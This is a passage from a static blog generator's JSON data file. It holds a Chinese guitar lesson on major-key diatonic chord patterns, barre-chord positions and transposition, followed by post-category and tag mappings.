236小，要牢牢记住。所有大调都是这个规律。很多书上用罗马数字来表示它们。</p>\n<p>要把它们当图案来记忆，非常整洁。想想，当你用横按和弦来弹奏，是不是就只有3个位置，简洁到极致时你弹整首歌就只需要在这3个位置上移来移去。尽管每个调的音不同，但级数规律是不变的，所以思考和弦进行时，把注意力放在数字上会更有优势。特别是转调的时候。</p>\n<p>转调只需要在指板其它位置上重复同样的数字图案。由第一个和弦决定是什么调。如果你在5品开始，你的所有和弦都是A调的，不需要考虑什么全全半全全全半、升这个音、降那个音。如果在7品开始，你就在弹奏B调的和弦，以此类推。如果你从6弦空弦开始，就是E调，在这个位置，一级和四级和弦就变成空弦和弦（想想前3品的E和弦和A和弦）。</p>\n<p>两个练习：你要不断往下移去练习不同的调。然后在不同调上练习相同的和弦进行，这就是转调练习。现在你一共拥有两个数字图案，也就是说一个调你可以在指板的两个不同位置弹奏出来。你可以从你的曲子里选取一个和弦进行，然后分别在两个位置上弹奏。很多吉他爱好者都被C调和G调惯坏了，这两个调几乎所有和弦都是空弦和弦，虽然好按，指法简单，但也丧失了横按和弦进行的简洁，更要命的是丧失了这种图案思维。我们现在需要做的当然不是发誓不用空弦和弦，空弦和弦非常好，没毛病，而是用数字图案的思维来弹奏空弦和弦。即当你弹奏开放和弦时，脑中要有相应横按和弦的思维图像。举G调的例，脑中形成6弦3品开始的G横按和弦（眼睛也可以相应盯着看，就像假动作），手却按出开放的G；脑中形成6弦5品的横按，你意识到它其实是个Am，然后按出开放的Am。只要你对6弦和5弦的音够熟悉就可以轻易做到，不要忘了在其它调上也这样练习。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>在记忆的时候遇到了一些问题，这里转载和整理一下 </p>\n<blockquote>\n<p><a href=\"https://www.zhihu.com/question/21202184/answer/683953151\">https://www.zhihu.com/question/21202184/answer/683953151</a> </p>\n</blockquote>\n<p>大调音阶有7个音，分别以它们为根音构建3和弦，和谐的只有6个，第7个构成的和弦因为太严肃不讨人喜欢基本被一脚踢开。所以我们可以简洁地讨论前边的6个和弦。</p>\n<table>\n<thead>\n<tr>\n<th>G</th>\n<th>Am</th>\n<th>Bm</th>\n<th>C</th>\n<th>D</th>\n<th>Em</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>A</td>\n<td>Bm</td>\n<td>C#m</td>\n<td>D</td>\n<td>E</td>\n<td>F#m</td>\n</tr>\n<tr>\n<td>C</td>\n<td>Dm</td>\n<td>Em</td>\n<td>F</td>\n<td>G</td>\n<td>Am</td>\n</tr>\n<tr>\n<td>D</td>\n<td>Em</td>\n<td>F#m</td>\n<td>G</td>\n<td>A</td>\n<td>Bm</td>\n</tr>\n<tr>\n<td>E</td>\n<td>F#m</td>\n<td>G#m</td>\n<td>A</td>\n<td>B</td>\n<td>C#m</td>\n</tr>\n<tr>\n<td>F</td>\n<td>Gm</td>\n<td>Am</td>\n<td>Bb</td>\n<td>C</td>\n<td>Dm</td>\n</tr>\n</tbody>\n</table>\n<p>看看它们，总结出级数与和弦特点之间的规律：</p>\n<ul>\n<li>大和弦</li>\n<li>小和弦</li>\n<li>小</li>\n<li>大</li>\n<li>大</li>\n<li>小</li>\n</ul>\n<p>它们可以说是音乐中最重要的规律，所有的音乐，要么直接使用它们，要么跟它们相关，145大 236小，要牢牢记住。所有大调都是这个规律。很多书上用罗马数字来表示它们。</p>\n<p>要把它们当图案来记忆，非常整洁。想想，当你用横按和弦来弹奏，是不是就只有3个位置，简洁到极致时你弹整首歌就只需要在这3个位置上移来移去。尽管每个调的音不同，但级数规律是不变的，所以思考和弦进行时，把注意力放在数字上会更有优势。特别是转调的时候。</p>\n<p>转调只需要在指板其它位置上重复同样的数字图案。由第一个和弦决定是什么调。如果你在5品开始，你的所有和弦都是A调的，不需要考虑什么全全半全全全半、升这个音、降那个音。如果在7品开始，你就在弹奏B调的和弦，以此类推。如果你从6弦空弦开始，就是E调，在这个位置，一级和四级和弦就变成空弦和弦（想想前3品的E和弦和A和弦）。</p>\n<p>两个练习：你要不断往下移去练习不同的调。然后在不同调上练习相同的和弦进行，这就是转调练习。现在你一共拥有两个数字图案，也就是说一个调你可以在指板的两个不同位置弹奏出来。你可以从你的曲子里选取一个和弦进行，然后分别在两个位置上弹奏。很多吉他爱好者都被C调和G调惯坏了，这两个调几乎所有和弦都是空弦和弦，虽然好按，指法简单，但也丧失了横按和弦进行的简洁，更要命的是丧失了这种图案思维。我们现在需要做的当然不是发誓不用空弦和弦，空弦和弦非常好，没毛病，而是用数字图案的思维来弹奏空弦和弦。即当你弹奏开放和弦时，脑中要有相应横按和弦的思维图像。举G调的例，脑中形成6弦3品开始的G横按和弦（眼睛也可以相应盯着看，就像假动作），手却按出开放的G；脑中形成6弦5品的横按，你意识到它其实是个Am，然后按出开放的Am。只要你对6弦和5弦的音够熟悉就可以轻易做到，不要忘了在其它调上也这样练习。</p>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"ckkljsarv0006r2421a4xdztw","category_id":"ckkljsarr0003r242rvfks7k6","_id":"ckkljsas1000cr242x7myw4xw"},{"post_id":"ckkljsarl0000r2424opge3nv","category_id":"ckkljsarr0003r242rvfks7k6","_id":"ckkljsas3000hr2427vzahjqo"},{"post_id":"ckkljsas0000br242mm97zowg","category_id":"ckkljsarr0003r242rvfks7k6","_id":"ckkljsas5000kr242vzp6z0ql"},{"post_id":"ckkljsart0005r242nps67qny","category_id":"ckkljsarr0003r242rvfks7k6","_id":"ckkljsas6000nr242k5m3xsnh"},{"post_id":"ckkljsas1000er242juh181rq","category_id":"ckkljsarr0003r242rvfks7k6","_id":"ckkljsas8000rr242t0xq0mxu"},{"post_id":"ckkljsas3000jr2424ljxos1f","category_id":"ckkljsarr0003r242rvfks7k6","_id":"ckkljsas9000vr242c9druit5"},{"post_id":"ckkljsarw0007r2428u6zrj6q","category_id":"ckkljsas2000fr242eimzz8gr","_id":"ckkljsasa000yr24202nlqypw"},{"post_id":"ckkljsas6000or242dm0eldr6","category_id":"ckkljsarr0003r242rvfks7k6","_id":"ckkljsasb0011r242px6s2e05"},{"post_id":"ckkljsas5000lr242q2t69zro","category_id":"ckkljsas7000qr242wfkex58e","_id":"ckkljsasd0015r242xx554720"},{"post_id":"ckkljsasa000zr242mewg2uiv","category_id":"ckkljsas2000fr242eimzz8gr","_id":"ckkljsase0018r242y11n2mjo"},{"post_id":"ckkljsasc0013r242fwi7bb54","category_id":"ckkljsas2000fr242eimzz8gr","_id":"ckkljsasf001br242o4fd5ri6"},{"post_id":"ckkljsas8000sr242v7nmfur7","category_id":"ckkljsasb0010r242kwxcpn7d","_id":"ckkljsasg001fr242y8q4ngi9"},{"post_id":"ckkljsas9000wr242bk7wdbfv","category_id":"ckkljsase0017r242loilwhvs","_id":"ckkljsasj001kr242e9kpagcj"},{"post_id":"ckkljsash001gr242hn4ah3b2","category_id":"ckkljsasg001er242jtvqz94r","_id":"ckkljsasl001or2421rsk43g3"},{"post_id":"ckkljsasd0016r242uziz3h7s","category_id":"ckkljsasg001er242jtvqz94r","_id":"ckkljsasm001rr242fxj80s11"},{"post_id":"ckkljsasi001ir2424g2oylwo","category_id":"ckkljsasg001er242jtvqz94r","_id":"ckkljsaso001ur242g4219jfe"},{"post_id":"ckkljsasj001mr2424azfiu39","category_id":"ckkljsarr0003r242rvfks7k6","_id":"ckkljsasp001yr242881i80lc"},{"post_id":"ckkljsase0019r242xbavjxe4","category_id":"ckkljsasg001er242jtvqz94r","_id":"ckkljsasr0021r242gc1ob5ru"},{"post_id":"ckkljsasl001pr242udh1jgr3","category_id":"ckkljsarr0003r242rvfks7k6","_id":"ckkljsass0024r242tiihob5v"},{"post_id":"ckkljsasn001tr242waw9vz6k","category_id":"ckkljsarr0003r242rvfks7k6","_id":"ckkljsasw0026r242q4mh0uyv"},{"post_id":"ckkljsasf001dr242ay50y3yp","category_id":"ckkljsasg001er242jtvqz94r","_id":"ckkljsasw0029r242ly5lgwun"},{"post_id":"ckkljsaso001wr2422dd8evow","category_id":"ckkljsas7000qr242wfkex58e","_id":"ckkljsasx002br2428wed4ggs"},{"post_id":"ckkljsasp001zr242i4hi5a46","category_id":"ckkljsarr0003r242rvfks7k6","_id":"ckkljsasx002dr242r09e9ykn"},{"post_id":"ckkljsasr0022r242h7atj8rq","category_id":"ckkljsarr0003r242rvfks7k6","_id":"ckkljsasy002fr24266vb99h8"},{"post_id":"ckkljsatz002vr24229zm5g0v","category_id":"ckkljsas7000qr242wfkex58e","_id":"ckkljsau4002zr242rga14ks5"},{"post_id":"ckkljsau2002xr242hfp486pb","category_id":"ckkljsas7000qr242wfkex58e","_id":"ckkljsau50031r242k0awvig7"}],"PostTag":[{"post_id":"ckkljsarv0006r2421a4xdztw","tag_id":"ckkljsart0004r242o4v8tw9r","_id":"ckkljsarz000ar242dl0mn3i5"},{"post_id":"ckkljsarl0000r2424opge3nv","tag_id":"ckkljsart0004r242o4v8tw9r","_id":"ckkljsas1000dr242c3168n5p"},{"post_id":"ckkljsart0005r242nps67qny","tag_id":"ckkljsart0004r242o4v8tw9r","_id":"ckkljsas3000ir242nduii3ca"},{"post_id":"ckkljsarw0007r2428u6zrj6q","tag_id":"ckkljsas2000gr242afckupcl","_id":"ckkljsas7000pr2423an2igtk"},{"post_id":"ckkljsas6000or242dm0eldr6","tag_id":"ckkljsart0004r242o4v8tw9r","_id":"ckkljsas9000ur2422pl0hqos"},{"post_id":"ckkljsas0000br242mm97zowg","tag_id":"ckkljsas6000mr2420zg3hikq","_id":"ckkljsasa000xr24228oy9pay"},{"post_id":"ckkljsas1000er242juh181rq","tag_id":"ckkljsas9000tr24218yaon50","_id":"ckkljsasd0014r242l37lexgk"},{"post_id":"ckkljsas3000jr2424ljxos1f","tag_id":"ckkljsasc0012r242wuxm69g9","_id":"ckkljsasf001cr242q3g9ukgn"},{"post_id":"ckkljsas5000lr242q2t69zro","tag_id":"ckkljsasf001ar242v8ivjig6","_id":"ckkljsasj001jr242mhwsvg1w"},{"post_id":"ckkljsas8000sr242v7nmfur7","tag_id":"ckkljsash001hr2424sb9mfh0","_id":"ckkljsasm001qr2429vfkz97i"},{"post_id":"ckkljsas9000wr242bk7wdbfv","tag_id":"ckkljsasl001nr2423ktreltp","_id":"ckkljsasp001xr242red8g88c"},{"post_id":"ckkljsaso001wr2422dd8evow","tag_id":"ckkljsasf001ar242v8ivjig6","_id":"ckkljsasr0020r24233o6dtui"},{"post_id":"ckkljsasa000zr242mewg2uiv","tag_id":"ckkljsaso001vr2422zt2l129","_id":"ckkljsass0025r2421znuskt8"},{"post_id":"ckkljsasr0022r242h7atj8rq","tag_id":"ckkljsas6000mr2420zg3hikq","_id":"ckkljsasw0027r242767dqk86"},{"post_id":"ckkljsasc0013r242fwi7bb54","tag_id":"ckkljsaso001vr2422zt2l129","_id":"ckkljsasx002ar242pxrqvzoi"},{"post_id":"ckkljsasd0016r242uziz3h7s","tag_id":"ckkljsasw0028r2427vfqwlvt","_id":"ckkljsasx002er2421q9jiist"},{"post_id":"ckkljsase0019r242xbavjxe4","tag_id":"ckkljsasw0028r2427vfqwlvt","_id":"ckkljsasy002hr242oyp9akxw"},{"post_id":"ckkljsasf001dr242ay50y3yp","tag_id":"ckkljsasy002gr24242tyc10y","_id":"ckkljsasy002jr2429yhtg9qm"},{"post_id":"ckkljsash001gr242hn4ah3b2","tag_id":"ckkljsasy002ir2421syovyzb","_id":"ckkljsasz002lr242aypomvtp"},{"post_id":"ckkljsasi001ir2424g2oylwo","tag_id":"ckkljsasy002ir2421syovyzb","_id":"ckkljsat0002nr2423k8f4zbm"},{"post_id":"ckkljsasj001mr2424azfiu39","tag_id":"ckkljsasz002mr242cigabyn0","_id":"ckkljsat0002pr242lk9w5o1x"},{"post_id":"ckkljsasl001pr242udh1jgr3","tag_id":"ckkljsat0002or242m4aimyuo","_id":"ckkljsat1002rr2422123ynnr"},{"post_id":"ckkljsasn001tr242waw9vz6k","tag_id":"ckkljsat0002qr242ptguy9k3","_id":"ckkljsat1002tr242s3i10hra"},{"post_id":"ckkljsasp001zr242i4hi5a46","tag_id":"ckkljsat1002sr242482dz7hf","_id":"ckkljsat1002ur242w15szdzj"},{"post_id":"ckkljsatz002vr24229zm5g0v","tag_id":"ckkljsasf001ar242v8ivjig6","_id":"ckkljsau3002yr24292ec3awx"},{"post_id":"ckkljsau2002xr242hfp486pb","tag_id":"ckkljsasf001ar242v8ivjig6","_id":"ckkljsau50030r242fcsvyjss"}],"Tag":[{"name":"Linux","_id":"ckkljsart0004r242o4v8tw9r"},{"name":"methdology","_id":"ckkljsas2000gr242afckupcl"},{"name":"distributed System","_id":"ckkljsas6000mr2420zg3hikq"},{"name":"troubleshooting","_id":"ckkljsas9000tr24218yaon50"},{"name":"music","_id":"ckkljsasc0012r242wuxm69g9"},{"name":"jazz","_id":"ckkljsasf001ar242v8ivjig6"},{"name":"database","_id":"ckkljsash001hr2424sb9mfh0"},{"name":"research","_id":"ckkljsasl001nr2423ktreltp"},{"name":"finance","_id":"ckkljsaso001vr2422zt2l129"},{"name":"security","_id":"ckkljsasw0028r2427vfqwlvt"},{"name":"cryptography","_id":"ckkljsasy002gr24242tyc10y"},{"name":"hacker101","_id":"ckkljsasy002ir2421syovyzb"},{"name":"linux","_id":"ckkljsasz002mr242cigabyn0"},{"name":"Hyperledger","_id":"ckkljsat0002or242m4aimyuo"},{"name":"serverless","_id":"ckkljsat0002qr242ptguy9k3"},{"name":"Kubernetes","_id":"ckkljsat1002sr242482dz7hf"}]}}